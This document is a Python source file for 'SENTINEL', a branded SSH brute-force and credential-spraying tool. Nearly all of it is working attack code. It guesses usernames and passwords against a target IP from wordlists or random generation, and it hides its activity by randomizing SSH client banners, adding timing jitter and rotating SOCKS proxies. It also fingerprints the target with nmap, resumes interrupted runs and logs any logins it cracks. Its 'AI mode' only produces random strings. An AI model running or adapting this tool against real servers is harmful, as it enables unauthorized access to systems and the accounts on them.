#!/usr/bin/env python3
import paramiko
import time
import logging
import argparse
import socks
import socket
import os
import random
import itertools
import nmap
import sys
import signal
import string
import platform
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from threading import Thread, Event
from colorama import init, Fore, Back, Style

# Initialize colorama for Windows
init()

# Try to import GPU-related libraries
try:
    import torch
    import numpy as np
    HAS_GPU = torch.cuda.is_available()
except ImportError:
    HAS_GPU = False

# Set up logging
logging.basicConfig(
    filename="ssh_attempts.log",
    level=logging.INFO,
    format="%(asctime)s - %(message)s",
)

# Evasion Settings
EVASION = {
    "jitter": (0.5, 3.2),  # Random delay range
    "client_versions": [
        "SSH-2.0-OpenSSH_8.2p1",
        "SSH-2.0-OpenSSH_7.9p1",
        "SSH-2.0-libssh_0.9.5"
    ],
    "ciphers": [
        "aes256-ctr",
        "aes192-ctr",
        "aes128-ctr"
    ]
}

class AICredentialGenerator:
    @staticmethod
    def generate_username(length=8):
        """AI-style username generation"""
        base = random.choice([
            string.ascii_lowercase,
            string.digits,
            string.ascii_letters
        ])
        return ''.join(random.choices(base, k=length)) + random.choice(['', '_', '.', str(random.randint(1,99))])

    @staticmethod
    def generate_password(min_len=8, max_len=16):
        """AI-style password generation"""
        char_sets = [
            string.ascii_letters,
            string.digits,
            "!@#$%^&*()_+-=[]{}|;:,.<>?"
        ]
        length = random.randint(min_len, max_len)
        password = []
        for _ in range(length):
            charset = random.choice(char_sets)
            password.append(random.choice(charset))
        return ''.join(password)

    @staticmethod
    def gpu_generate_credentials(batch_size, device):
        """Generate credentials using GPU acceleration"""
        try:
            # Create character sets tensor on GPU
            all_chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
            char_tensor = torch.tensor([ord(c) for c in all_chars], device=device)
            
            # Generate random indices for usernames and passwords
            username_lengths = torch.randint(6, 12, (batch_size,), device=device)
            password_lengths = torch.randint(8, 16, (batch_size,), device=device)
            
            usernames = []
            passwords = []
            
            # Generate usernames
            for length in username_lengths:
                indices = torch.randint(0, len(all_chars), (length,), device=device)
                chars = char_tensor[indices].cpu().numpy()
                username = ''.join([chr(c) for c in chars])
                usernames.append(username)
            
            # Generate passwords
            for length in password_lengths:
                indices = torch.randint(0, len(all_chars), (length,), device=device)
                chars = char_tensor[indices].cpu().numpy()
                password = ''.join([chr(c) for c in chars])
                passwords.append(password)
            
            return usernames, passwords
        except Exception as e:
            print(f"{Fore.RED}[!] GPU credential generation error: {e}{Style.RESET_ALL}")
            return None, None

class Spinner:
    """ASCII spinner animation for scanning phases"""
    def __init__(self):
        self.spinner_chars = '|/-\\'
        self.stop_event = Event()
        
    def spin(self):
        i = 0
        while not self.stop_event.is_set():
            sys.stdout.write(f'\rScanning... {self.spinner_chars[i]}')
            sys.stdout.flush()
            time.sleep(0.1)
            i = (i + 1) % 4
        sys.stdout.write('\r' + ' ' * 20 + '\r')  # Clear line

class StealthSSHClient(paramiko.SSHClient):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.transport = None

    def connect(self, hostname, port=22, **kwargs):
        """Override connection with evasion techniques"""
        try:
            self.transport = paramiko.Transport((hostname, port))
            self._configure_evasion()
            self.transport.start_client()
            if 'pkey' in kwargs:
                self.auth_publickey(username=kwargs['username'], key=kwargs['pkey'])
            else:
                self.transport.auth_password(username=kwargs['username'], password=kwargs['password'])
        except Exception as e:
            raise e

    def _configure_evasion(self):
        """Randomize client fingerprint"""
        self.transport.local_version = random.choice(EVASION['client_versions'])
        if paramiko.__version__ >= '2.9':
            self.transport.get_security_options().ciphers = EVASION['ciphers']

class SSHAttacker:
    def __init__(self, args):
        self.args = args
        self.proxies = self.load_proxies() if args.proxy_list else None
        self.current_proxy = None
        self.locked_accounts = set()
        self.delay = 1 / args.rate
        self.os_info = None
        self.ssh_version = None
        self.spinner = Spinner()
        self.progress_file = "attack.progress"
        self.running = True
        self.ai_mode = args.ai_mode
        self.last_user = None
        self.last_pass = None
        self.use_gpu = self.check_gpu() and not args.force_cpu
        self.successful_attempts = []
        self.current_attempt = 0
        self.gpu_device = torch.device("cuda") if self.use_gpu else None
        self.turbo_level = args.t if hasattr(args, 't') else 4
        self.batch_size = self._calculate_batch_size()
        signal.signal(signal.SIGINT, self.signal_handler)

    def _calculate_batch_size(self):
        """Calculate batch size based on turbo level"""
        if self.turbo_level == 7:
            return 10000  # Extreme batch size
        elif self.turbo_level == 6:
            return 5000   # GPU-focused batch size
        elif self.turbo_level == 5:
            return 2500   # Balanced batch size
        else:
            return 1000   # Default batch size

    def _configure_gpu_settings(self):
        """Configure GPU settings based on turbo level"""
        if not self.use_gpu:
            return
            
        try:
            if self.turbo_level >= 6:
                # Set GPU to maximum performance mode
                torch.cuda.set_device(0)
                torch.backends.cudnn.benchmark = True
                torch.backends.cudnn.enabled = True
                
                if self.turbo_level == 7:
                    # Additional extreme settings for level 7
                    torch.cuda.empty_cache()
                    try:
                        # Use new GradScaler syntax
                        self.scaler = torch.amp.GradScaler('cuda')
                        print(f"{Fore.GREEN}[*] AMP Enabled - Using Mixed Precision{Style.RESET_ALL}")
                    except Exception as amp_error:
                        print(f"{Fore.YELLOW}[!] AMP not available: {amp_error}. Continuing without mixed precision.{Style.RESET_ALL}")
                        self.scaler = None
        except Exception as e:
            print(f"{Fore.RED}[!] GPU configuration error: {e}{Style.RESET_ALL}")

    def check_gpu(self):
        """Check for GPU availability and capabilities"""
        if not HAS_GPU:
            return False
            
        try:
            gpu_count = torch.cuda.device_count()
            if gpu_count > 0:
                gpu_name = torch.cuda.get_device_name(0)
                gpu_memory = torch.cuda.get_device_properties(0).total_memory / 1024**3  # Convert to GB
                print(f"\n[*] GPU Detected: {gpu_name}")
                print(f"[*] GPU Memory: {gpu_memory:.2f} GB")
                print(f"[*] Number of GPUs: {gpu_count}")
                return True
            return False
        except Exception as e:
            print(f"[!] Error checking GPU: {e}")
            return False

    def print_attempt(self, username, password, status="trying"):
        """Print attempt with color coding"""
        percentage = (self.current_attempt / self.args.max_attempts) * 100
        status_line = f"[{percentage:3.1f}%] "
        
        if status == "trying":
            print(f"\r{Fore.CYAN}{status_line}Trying: {Fore.YELLOW}{username}{Fore.CYAN}:{Fore.GREEN}{password}{Style.RESET_ALL}", end="")
        elif status == "success":
            print(f"\n{Fore.GREEN}{status_line}Success: {Fore.YELLOW}{username}{Fore.GREEN}:{Fore.GREEN}{password}{Style.RESET_ALL}")
        elif status == "locked":
            print(f"\n{Fore.RED}{status_line}Account Locked: {Fore.YELLOW}{username}{Style.RESET_ALL}")
        elif status == "failed":
            print(f"\r{Fore.RED}{status_line}Failed: {Fore.YELLOW}{username}{Fore.RED}:{Fore.GREEN}{password}{Style.RESET_ALL}", end="")

    def gpu_accelerated_attack(self, batch_size=None):
        """GPU-accelerated credential generation and processing"""
        if batch_size is None:
            batch_size = self.batch_size
            
        try:
            print(f"{Fore.GREEN}[*] GPU Mode Active - Using: {torch.cuda.get_device_name(0)}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Turbo Level: {self.turbo_level} - Batch Size: {batch_size}{Style.RESET_ALL}")
            
            if self.turbo_level == 7:
                print(f"{Fore.YELLOW}[*] Extreme Mode - Maximum Performance{Style.RESET_ALL}")
                if hasattr(self, 'scaler') and self.scaler:
                    print(f"{Fore.GREEN}[*] Using Mixed Precision for Better Performance{Style.RESET_ALL}")
            
            # Configure GPU based on turbo level
            self._configure_gpu_settings()
            
            # Initialize memory settings based on turbo level
            if self.turbo_level >= 5:
                torch.cuda.empty_cache()
                if torch.cuda.is_available():
                    torch.cuda.set_per_process_memory_fraction(0.95)  # Use 95% of GPU memory
            
            # Create initial random seed tensor on GPU with larger size for higher turbo levels
            seed_size = batch_size * (2 if self.turbo_level >= 6 else 1)
            seed_tensor = torch.randint(0, 2**32, (seed_size,), device=self.gpu_device)
            
            self.current_attempt = 0
            with tqdm(total=self.args.max_attempts, desc=f"{Fore.CYAN}Turbo Attack L{self.turbo_level}{Style.RESET_ALL}",
                     bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} "
                     "[{elapsed}<{remaining}, {rate_fmt}] {postfix}") as pbar:
                
                processed = 0
                while processed < self.args.max_attempts and self.running:
                    # Generate credentials in larger batches for higher turbo levels
                    usernames, passwords = AICredentialGenerator.gpu_generate_credentials(
                        batch_size=batch_size,
                        device=self.gpu_device
                    )
                    
                    if usernames is None or passwords is None:
                        print(f"{Fore.YELLOW}[*] Falling back to CPU generation{Style.RESET_ALL}")
                        return self.ai_credential_attack(self.args.max_attempts)
                    
                    # Adjust thread count based on turbo level
                    thread_multiplier = max(1, min(self.turbo_level - 3, 3))
                    max_workers = self.args.threads * thread_multiplier
                    
                    with ThreadPoolExecutor(max_workers=max_workers) as executor:
                        futures = []
                        for username, password in zip(usernames, passwords):
                            if not self.running:
                                break
                            self.last_user, self.last_pass = username, password
                            self.current_attempt += 1
                            self.print_attempt(username, password)
                            futures.append(executor.submit(self.ssh_connect, username, password))
                            
                            # Adjust delay based on turbo level
                            if self.turbo_level >= 6:
                                time.sleep(self.delay * 0.1)  # 90% faster
                            elif self.turbo_level == 5:
                                time.sleep(self.delay * 0.5)  # 50% faster
                            else:
                                time.sleep(self.delay)
                            
                            # Update progress bar with dynamic info
                            pbar.set_postfix_str(f"T{self.turbo_level} | {username}:{password}")
                            
                        for future in as_completed(futures):
                            if future.result():
                                return True
                            
                        processed += len(futures)
                        pbar.update(len(futures))
                        
                        # Force GPU memory cleanup based on turbo level
                        if self.turbo_level >= 5 and processed % (batch_size * 5) == 0:
                            torch.cuda.empty_cache()
                            
            return False
        except Exception as e:
            print(f"\n{Fore.RED}[!] GPU acceleration error: {e}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Falling back to CPU mode{Style.RESET_ALL}")
            return self.ai_credential_attack(self.args.max_attempts)

    def ai_credential_attack(self, max_attempts=1000):
        """AI-driven credential spraying"""
        print(f"{Fore.YELLOW}[*] CPU Mode Active{Style.RESET_ALL}")
        self.current_attempt = 0
        with tqdm(total=max_attempts, desc=f"{Fore.CYAN}CPU Attack{Style.RESET_ALL}",
                 bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} "
                 "[{elapsed}<{remaining}, {rate_fmt}] {postfix}") as pbar:
            with ThreadPoolExecutor(max_workers=self.args.threads) as executor:
                futures = []
                for _ in range(max_attempts):
                    if not self.running:
                        break
                    username = AICredentialGenerator.generate_username()
                    password = AICredentialGenerator.generate_password()
                    self.last_user, self.last_pass = username, password
                    self.current_attempt += 1
                    self.print_attempt(username, password)
                    futures.append(executor.submit(self.ssh_connect, username, password))
                    
                    # Update progress bar with attempt info
                    pbar.set_postfix_str(f"Current: {username}:{password}")
                    
                    time.sleep(self.delay)
                    pbar.update(1)
                
                for future in as_completed(futures):
                    if future.result():
                        return True
        return False

    def signal_handler(self, signum, frame):
        """Handle Ctrl+C gracefully"""
        print(f"\n{Fore.YELLOW}[!] Interrupt received, shutting down...{Style.RESET_ALL}")
        self.running = False
        self.save_progress(self.last_user, self.last_pass)
        if self.successful_attempts:
            print(f"\n{Fore.GREEN}[+] Successful attempts:{Style.RESET_ALL}")
            for username, password in self.successful_attempts:
                print(f"{Fore.GREEN}    {username}:{password}{Style.RESET_ALL}")
        sys.exit(0)

    def load_proxies(self):
        try:
            with open(self.args.proxy_list, "r") as f:
                return [line.strip() for line in f.readlines()]
        except Exception as e:
            print(f"[!] Error loading proxies: {e}")
            return None

    def rotate_proxy(self):
        if self.proxies:
            try:
                self.current_proxy = random.choice(self.proxies)
                proxy_type = socks.SOCKS5 if "socks5" in self.current_proxy else socks.SOCKS4
                host, port = self.current_proxy.split(":")
                socks.set_default_proxy(proxy_type, host, int(port))
                socket.socket = socks.socksocket
            except Exception as e:
                print(f"[!] Proxy error: {e}")

    def fingerprint_target(self):
        """Fingerprint target with animated spinner"""
        print(f"\n{Fore.CYAN}[*] Attempting to fingerprint target...{Style.RESET_ALL}")
        scan_thread = Thread(target=self._run_nmap_scan)
        scan_thread.start()
        
        self.spinner.stop_event.clear()
        spinner_thread = Thread(target=self.spinner.spin)
        spinner_thread.start()

        scan_thread.join()
        self.spinner.stop_event.set()
        spinner_thread.join()

    def _run_nmap_scan(self):
        try:
            # Try to import nmap here to provide better error message
            try:
                import nmap
            except ImportError:
                print(f"\n{Fore.YELLOW}[!] Nmap Python module not found. Install with: pip install python-nmap{Style.RESET_ALL}")
                return
                
            # Check if nmap executable exists
            from shutil import which
            if which('nmap') is None:
                print(f"\n{Fore.YELLOW}[!] Nmap not found. Install Nmap first:{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Windows: choco install nmap{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Linux: sudo apt install nmap{Style.RESET_ALL}")
                return
                
            scanner = nmap.PortScanner()
            scanner.scan(self.args.ip, arguments=f"-p {self.args.port} -O -sV")
            if self.args.ip in scanner.all_hosts():
                self.os_info = scanner[self.args.ip].get("osmatch", [{}])[0].get("name", "Unknown")
                self.ssh_version = scanner[self.args.ip].get("tcp", {}).get(self.args.port, {}).get("version", "Unknown")
                print(f"\n{Fore.GREEN}[*] Target OS: {self.os_info}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[*] SSH Version: {self.ssh_version}{Style.RESET_ALL}")
                logging.info(f"OS: {self.os_info}, SSH Version: {self.ssh_version}")
        except Exception as e:
            print(f"\n{Fore.YELLOW}[!] Fingerprinting skipped: {e}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Continuing without target fingerprinting...{Style.RESET_ALL}")

    def ssh_connect(self, username, password):
        if not self.running:
            return False
            
        ssh = StealthSSHClient() if self.ai_mode else paramiko.SSHClient()
        if not self.ai_mode:
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
        try:
            if self.proxies:
                self.rotate_proxy()

            key = None
            if self.args.ssh_key:
                key = paramiko.RSAKey.from_private_key_file(self.args.ssh_key)

            connect_kwargs = {
                'hostname': self.args.ip,
                'port': self.args.port,
                'username': username,
                'password': password,
                'timeout': self.args.timeout,
                'banner_timeout': 30,
            }
            
            if key:
                connect_kwargs['pkey'] = key

            ssh.connect(**connect_kwargs)
            self.print_attempt(username, password, "success")
            self.successful_attempts.append((username, password))
            logging.info(f"SUCCESS: {username}:{password}")
            ssh.close()
            return True
        except paramiko.AuthenticationException as e:
            if "Account locked" in str(e):
                self.locked_accounts.add(username)
                self.print_attempt(username, password, "locked")
                logging.warning(f"Account locked: {username}")
            else:
                self.print_attempt(username, password, "failed")
            return False
        except Exception as e:
            logging.error(f"Error: {e}")
            self.delay = min(self.delay * 2, 5)
            return False

    def generate_passwords(self):
        """Enhanced password generation with custom wordlist"""
        base_words = self.load_wordlist() if self.args.wordlist else ["admin", "root", "password"]
        years = ["2023", "2024", "!"]
        suffixes = ["!", "#", "$", "%"]
        leet_speak = {"a": "@", "e": "3", "i": "1", "o": "0", "s": "$"}
        
        for word in base_words:
            # Original word variations
            yield word
            yield word.capitalize()
            
            # Year combinations
            for year in years:
                yield f"{word}{year}"
                yield f"{word.capitalize()}{year}"
                
            # Leet speak variations
            leet_word = "".join(leet_speak.get(c, c) for c in word)
            if leet_word != word:
                yield leet_word
                for suffix in suffixes:
                    yield f"{leet_word}{suffix}"

    def load_wordlist(self):
        try:
            with open(self.args.wordlist, "r") as f:
                return [line.strip() for line in f]
        except Exception as e:
            print(f"[!] Error loading wordlist: {e}")
            return []

    def save_progress(self, username, password):
        try:
            with open(self.progress_file, "w") as f:
                f.write(f"{username}\n{password}")
        except Exception as e:
            print(f"[!] Failed to save progress: {e}")

    def load_progress(self):
        try:
            if os.path.exists(self.progress_file):
                with open(self.progress_file, "r") as f:
                    lines = f.readlines()
                    return lines[0].strip(), lines[1].strip()
        except Exception as e:
            print(f"[!] Failed to load progress: {e}")
        return None, None

    def run(self):
        print("[*] Starting SSH security assessment")
        print(f"[*] Target: {self.args.ip}:{self.args.port}")
        
        # System information
        print(f"[*] System: {platform.system()} {platform.release()}")
        print(f"[*] Architecture: {platform.machine()}")
        print(f"[*] Processor: {platform.processor()}")
        
        self.fingerprint_target()
        
        if self.ai_mode:
            print("[*] Running in AI credential generation mode")
            if self.use_gpu:
                print("[*] Using GPU acceleration")
                self.gpu_accelerated_attack()
            else:
                print("[*] Using CPU mode")
                self.ai_credential_attack(self.args.max_attempts)
            return

        # Original wordlist-based attack logic
        if self.args.generate_passwords:
            passwords = self.generate_passwords()
        else:
            with open(self.args.passwords, "r") as f:
                passwords = [line.strip() for line in f]

        usernames = []
        with open(self.args.usernames, "r") as f:
            usernames = [line.strip() for line in f]

        # Resume progress if available
        last_user, last_pass = self.load_progress()
        if last_user and last_pass:
            print(f"[*] Resuming from: {last_user}:{last_pass}")
            start_user = usernames.index(last_user)
            start_pass = passwords.index(last_pass)
            usernames = usernames[start_user:]
            passwords = passwords[start_pass:]

        total = len(usernames) * (len(passwords) if not self.args.generate_passwords else 1000)
        
        # Enhanced progress bar with metrics
        with tqdm(total=total, desc="Progress", unit="attempt",
                 bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} "
                 "[{rate_fmt}{postfix}, ETA: {remaining}]") as pbar:
            with ThreadPoolExecutor(max_workers=self.args.threads) as executor:
                futures = []
                for username in usernames:
                    if not self.running:
                        break
                    if username in self.locked_accounts:
                        continue
                        
                    for password in passwords:
                        if not self.running:
                            break
                            
                        self.last_user, self.last_pass = username, password
                        future = executor.submit(self.ssh_connect, username, password)
                        futures.append(future)
                        time.sleep(self.delay)
                        
                        # Update progress bar with dynamic info
                        pbar.set_postfix({
                            "Delay": f"{self.delay:.2f}s",
                            "Proxies": len(self.proxies) if self.proxies else 0,
                            "Locked": len(self.locked_accounts)
                        })
                        pbar.update(1)

                        # Save progress every 10 attempts
                        if pbar.n % 10 == 0:
                            self.save_progress(username, password)

                # Check for successful attempts
                for future in as_completed(futures):
                    if future.result():
                        executor.shutdown(wait=False)
                        self.save_progress(username, password)
                        print("[*] Valid credentials found, stopping attack")
                        return

        print("\n[*] Attack completed")

def type_text(text, delay=0.03, end='\n'):
    """Type out text with a delay"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(end)

def display_welcome_animation():
    """Display welcome animation"""
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Enhanced ASCII art collection
    sentinel_logo = f"""{Fore.CYAN}
    ╔═══════════════════════════════════════════════════════════════╗
    ║  ███████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗███████╗██╗ ║
    ║  ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║ ║
    ║  ███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║ ║
    ║  ╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║ ║
    ║  ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗██║ ║
    ║  ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝ ║
    ╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}"""

    cyber_heart = f"""{Fore.RED}
         /\\     /\\   {Fore.YELLOW}┌──────────────────┐{Fore.RED}
        /  \\   /  \\  {Fore.YELLOW}│  {Fore.CYAN}SYSTEM LOADING  {Fore.YELLOW}│{Fore.RED}
       /    \\ /    \\ {Fore.YELLOW}└──────────────────┘{Fore.RED}
       \\     |     /
        \\         /    {Fore.CYAN}[■■■■■■■■■■■■■■■■]{Fore.RED}
         \\       /     {Fore.CYAN}INITIALIZING...{Fore.RED}
          \\     /
           \\   /       {Fore.YELLOW}SECURITY LEVEL: MAXIMUM{Fore.RED}
            \\ /        {Fore.YELLOW}STEALTH MODE: ENABLED{Fore.RED}
             V{Style.RESET_ALL}"""

    matrix_border = f"{Fore.GREEN}║ {Style.RESET_ALL}"
    
    # Animated display sequence
    print(f"{Fore.GREEN}Initializing SENTINEL Framework...{Style.RESET_ALL}")
    time.sleep(0.5)
    
    # Display logo with typing effect
    for line in sentinel_logo.split('\n'):
        type_text(line, 0.01)
    time.sleep(0.3)
    
    # Display cyber heart with matrix effect
    print("\n" * 2)
    for line in cyber_heart.split('\n'):
        type_text(line, 0.02)
    
    # Welcome messages with matrix-style border
    print("\n")
    messages = [
        (f"{Fore.CYAN}Welcome to the Next Generation of Security Assessment{Style.RESET_ALL}", 0.05),
        (f"{Fore.YELLOW}Created with {Fore.RED}♥{Fore.YELLOW} by {Fore.CYAN}unknone hart{Style.RESET_ALL}", 0.05),
        (f"{Fore.MAGENTA}Advancing the Art of Security Testing{Style.RESET_ALL}", 0.05)
    ]
    
    # Display messages with matrix border
    print(f"{Fore.GREEN}╔{'═' * 60}╗{Style.RESET_ALL}")
    for msg, delay in messages:
        print(f"{matrix_border}", end="")
        type_text(f"{msg:<58}", delay, end="")
        print(f"{matrix_border}")
    print(f"{Fore.GREEN}╚{'═' * 60}╝{Style.RESET_ALL}")
    
    # System initialization animation
    print("\n")
    steps = [
        (f"{Fore.GREEN}[+] Initializing Core Systems", "DONE", 0.3),
        (f"{Fore.CYAN}[+] Loading Security Modules", "OK", 0.2),
        (f"{Fore.YELLOW}[+] Configuring Attack Vectors", "READY", 0.2),
        (f"{Fore.MAGENTA}[+] Activating Stealth Protocols", "ENABLED", 0.2),
        (f"{Fore.RED}[+] Engaging Maximum Performance", "ACTIVE", 0.2)
    ]
    
    for msg, status, delay in steps:
        print(f"{msg}", end="", flush=True)
        time.sleep(delay)
        for _ in range(3):
            print(".", end="", flush=True)
            time.sleep(0.1)
        print(f" {Fore.GREEN}{status}!{Style.RESET_ALL}")
    
    # Final touch
    print("\n" + "=" * 62)
    type_text(f"{Fore.CYAN}[*] SENTINEL is ready for deployment. Proceed with caution.{Style.RESET_ALL}", 0.03)
    print("=" * 62 + "\n")
    time.sleep(0.5)

if __name__ == "__main__":
    # Display welcome animation
    display_welcome_animation()
    
    parser = argparse.ArgumentParser(description=f"{Fore.CYAN}Advanced SSH Security Assessment Tool{Style.RESET_ALL}")
    parser.add_argument("--ip", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=22, help="SSH port")
    parser.add_argument("--usernames", help="Username wordlist")
    parser.add_argument("--passwords", help="Password wordlist")
    parser.add_argument("--ssh-key", help="SSH private key for key-based auth")
    parser.add_argument("--generate-passwords", action="store_true", 
                       help="Generate dynamic passwords")
    parser.add_argument("--wordlist", help="Custom base wordlist for password generation")
    parser.add_argument("--threads", type=int, default=10, 
                       help="Concurrent workers (default: 10)")
    parser.add_argument("--rate", type=float, default=1, 
                       help="Initial attempts per second (default: 1)")
    parser.add_argument("--timeout", type=int, default=5, 
                       help="Connection timeout (default: 5s)")
    parser.add_argument("--proxy-list", help="Proxy list file (format: host:port)")
    parser.add_argument("--ai-mode", action="store_true",
                       help="Use AI-driven credential generation")
    parser.add_argument("--max-attempts", type=int, default=1000,
                       help="Maximum attempts for AI mode (default: 1000)")
    parser.add_argument("--force-cpu", action="store_true",
                       help="Force CPU mode even if GPU is available")
    parser.add_argument("--t", type=int, choices=[4,5,6,7], default=4,
                       help="Turbo level (4=Default, 5=Full Hardware, 6=GPU Max, 7=Extreme)")
    
    args = parser.parse_args()
    
    if not args.ai_mode and not args.usernames:
        parser.error(f"{Fore.RED}Must specify --usernames when not in AI mode{Style.RESET_ALL}")
    if not args.ai_mode and not (args.generate_passwords or args.passwords):
        parser.error(f"{Fore.RED}Must specify either --passwords or --generate-passwords when not in AI mode{Style.RESET_ALL}")
        
    print(f"{Fore.CYAN}""" + """
    ███████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗███████╗██╗     
    ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║     
    ███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║     
    ╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║     
    ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗
    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝
    """ + Style.RESET_ALL + """
    """ + Fore.GREEN + """[SSH Enhanced Network Testing Intelligence & Network Entry Logic]""" + Style.RESET_ALL + """
    
         🔒 """ + Fore.YELLOW + """Advanced SSH Security Assessment Framework""" + Style.RESET_ALL + """ 🔒
         
    System Information:
    ------------------
    """ + Fore.CYAN + f"""CPU: {platform.processor()}
    GPU: {"Available" if HAS_GPU else "Not Available"}""" + Style.RESET_ALL + """
    
    """ + Fore.RED + """ETHICAL USE ONLY - UNAUTHORIZED ACCESS IS ILLEGAL""" + Style.RESET_ALL + """
    """)
    
    print(f"{Fore.CYAN}Turbo Level: {args.t}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Hardware Utilization:{Style.RESET_ALL}")
    print(f"{'█' * args.t}{'░' * (7-args.t)} [{args.t}/7]")
    
    attacker = SSHAttacker(args)
    attacker.run()